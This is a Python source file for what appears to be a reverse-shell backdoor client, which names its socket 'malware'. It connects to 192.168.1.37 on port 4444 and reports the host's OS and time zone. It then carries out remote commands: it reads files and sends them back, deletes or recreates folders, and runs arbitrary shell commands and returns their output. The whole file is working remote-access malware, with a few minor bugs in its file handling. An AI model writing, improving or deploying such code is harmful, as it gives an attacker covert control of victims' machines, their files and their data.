import socket
import pyautogui
import os
import subprocess
import platform
import datetime
import shutil

def send_command():
    sys_os = platform.system()
    malware.send(sys_os.encode())
    time_zone = str(datetime.datetime.now().astimezone().tzinfo) + " - " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    malware.send(time_zone.encode())

#FOLD
def change_fold(path):
    try:
        os.chdir(path)
        return "[+] Change a {}".format(os.getcwd())
    except Exception as e:
        return str(e).encode()
    
def create_fold(path):
    try:
        if not os.path.exists(path):
            os.mkdir(path)
            return ("[+] Created folder. {}".format(os.getcwd()))
        else:
            shutil.rmtree(path)
            os.makedirs(path)
            return ("[*] Directory successfully deleted.\n[+] Folder was created. {}".format(os.getcwd()))
    except Exception as e:
        return str(e).encode()

def deleted_fold(path):
    try:
        os.rmdir(path)
        return "[+] Deleted folder. {}".format(os.getcwd())
    except Exception as e:
        return str(e).encode()    

#FILE
def created_file(path):
    try:
        file_path = path
        #created file
        with open(file_path, 'w') as files:
            pass
        return f"[+] Created file: {file_path}"  
    except Exception as e:
        return str(e).encode()
        
def read_file(path):
    try:
        if not os.path.exists:
            msg = f'[-] The file does not exists. {path}'
            return msg
        read_file = open(f'{path}', 'rb')
        send_content = read_file.read()
        read_file.close()
        return send_content

    except Exception as e:
        return str(e).encode()

    
def edit_file(path, content):
    try:
        created_file(path)

    except Exception as e:
        return str(e).encode()

# Execution cmd
def exe_recv(msg_recv):
    try:
        res = subprocess.run(msg_recv, shell=True, text=True, capture_output=True)
        output = res.stdout
        malware.send(output.encode())
    except Exception as e:
        print(f"Error execute command: {e}")

if __name__ == '__main__':
    try:
        malware = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        malware.connect(('192.168.1.37', 4444))
        send_command()
        while True:
            msg_recv = malware.recv(1024).decode()
            if msg_recv == 'exit':
                malware.close()
                break
            elif msg_recv.startswith('cd'):
                msg = change_fold(msg_recv[3:])
                malware.send(msg.encode())
            elif msg_recv.startswith('mkdir'):
                msg = create_fold(msg_recv[6:])
                malware.send(msg.encode())
            elif msg_recv.startswith('md'):
                msg = create_fold(msg_recv[3:])
                malware.send(msg.encode())
            elif msg_recv.startswith('rd'):
                msg = deleted_fold(msg_recv[3:])
                malware.send(msg.encode())
            elif msg_recv.startswith('rmdir'):
                msg = deleted_fold(msg_recv[6:])
                malware.send(msg.encode())
            elif msg_recv.startswith('touch'):
                msg = created_file(msg_recv[6:])
                malware.send(msg.encode())
            elif msg_recv.startswith('cat'):
                msg = read_file(msg_recv[4:])
                malware.send(msg)
            elif msg_recv.startswith('nano'):#####Edit
                content_recv = malware.recv(4096).decode()######
                response = edit_file(msg_recv[5:], content_recv)######
            else:
                exe_recv(msg_recv)
    except Exception as e:
        print('Error: ',e)
    except KeyboardInterrupt as k:
        print('KeyboardInterrupt: ',k)